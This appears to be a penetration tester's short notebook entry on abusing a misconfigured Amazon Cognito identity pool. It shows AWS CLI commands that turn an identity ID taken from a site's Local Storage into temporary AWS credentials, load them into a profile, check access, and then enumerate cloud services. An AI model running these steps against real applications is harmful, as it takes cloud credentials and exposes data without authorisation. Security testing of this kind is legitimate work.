# Amazon Cognito missconfiguration



## How found

```
Found 
- com.amplify.Cognito.eu-west-1.blalalalalalalalalala.identityId
- Value (eu-west-1:e3923078-cccc-bbbb-aaaa-xxxxxxxxxxxx)
both in Local Storage (always should check Local Storage)

use command:

aws cognito-identity get-credentials-for-identity \n
--identity-id "eu-west-1:e3923078-cccc-bbbb-aaaa-xxxxxxxxxxxx"

Data
{
Credentials:
    { "Access..": ...
    "SecretKey": ...
    "SessionToken": ...
    }
    
```

<figure><img src="../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

```
Next use that access and secret key access data

aws configure --profile profiletest

because of that session have  time to out, we should config in

~/.aws/credentials

Manual add line aws_session_token is SessionToken
```

<figure><img src="../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

```
Next test 

aws sts get-caller-identity --profile profiletest

use tools to exploit
https://github.com/NotSoSecure/cloud-service-enum.git
```

{% embed url="https://awstip.com/how-i-exploited-amazon-cognito-misconfigurations-to-access-confidential-s3-data-badb62cabfab" %}
